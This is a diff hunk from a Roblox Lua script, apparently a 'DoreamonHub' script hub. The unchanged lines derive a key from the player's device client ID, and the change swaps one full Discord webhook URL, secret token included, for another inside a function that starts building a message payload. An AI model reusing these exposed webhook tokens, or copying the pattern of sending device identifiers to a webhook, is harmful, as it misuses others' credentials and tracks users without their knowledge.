@@ -8,7 +8,7 @@ local ClientId = game:GetService("RbxAnalyticsService"):GetClientId()
 local Hwide = string.split((ClientId),'-')
 local Key = Hwide[1]..Hwide[5].."_DoreamonHub"
 function DiscordHookCheck()
-    local url = "https://discord.com/api/webhooks/1164576705223065690/v_CMsHwmX4Bg9NjaNzm0cubwVAXIA9qfHJmuBvUmkAtwMOTPtGQtOqobOC7kF2A0GUaX"
+    local url = "https://discord.com/api/webhooks/1164631705995452416/f32mjXcaNwrUQhafM1jaUDKlh4c4LHSTzkK7WAK_vHZea2eAzRqAL5-yyhNhMExZjFKM"
     local data = {
     ["content"] = "",
     ["embeds"] = {
